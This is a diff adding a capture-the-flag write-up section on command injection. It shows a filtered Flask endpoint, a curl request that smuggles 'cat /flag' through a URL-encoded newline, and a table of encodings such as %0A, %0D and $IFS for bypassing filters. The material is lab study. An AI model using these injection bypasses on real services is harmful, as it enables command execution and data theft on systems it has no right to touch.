@@ -79,3 +79,48 @@ while True:
             print(flag)
     j+=1
 ```
+
+#### CMDi 6
+
+```python
+arg = (
+        flask.request.args.get("root", "/challenge")
+        .replace(";", "")
+        .replace("&", "")
+        .replace("|", "")
+        .replace(">", "")
+        .replace("<", "")
+        .replace("(", "")
+        .replace(")", "")
+        .replace("`", "")
+        .replace("$", "")
+    )
+    command = f"ls -l {arg}"
+```
+
+`curl "http://challenge.localhost:80/exercise?root=%0Acat+/flag"`
+
+it should be url-encoded, otherwise it will be escaped.
+
+I guess the reason this (and not other url encoded characters) works is that `\`
+isn't replaced. (also \n is two character, maybe that helps too)
+
+```
+DEBUG: command='ls -l \ncat /flag'
+127.0.0.1 - - [15/Mar/2025 07:55:34] "GET /exercise?root=%0Acat+/flag HTTP/1.1" 200 -
+```
+
+In URL encoding, `%0A` represents a newline character (\n).
+
+these might be helpful:
+
+```
+\n (newline)	%0A	Splits command into two
+\r (carriage return)	%0D	Works like \n, useful in Windows
+\t (tab)	%09	Can separate arguments unexpectedly
+IFS (space alternative)	$IFS	Bypasses space-based filters
+\b (backspace)	%08	May remove characters unexpectedly
+\v (vertical tab)	%0B	Can cause unexpected behavior in some systems
+\x00 (null byte)	%00	Can truncate strings in some functions
+\e (escape)	-	Can manipulate terminal behavior
+```
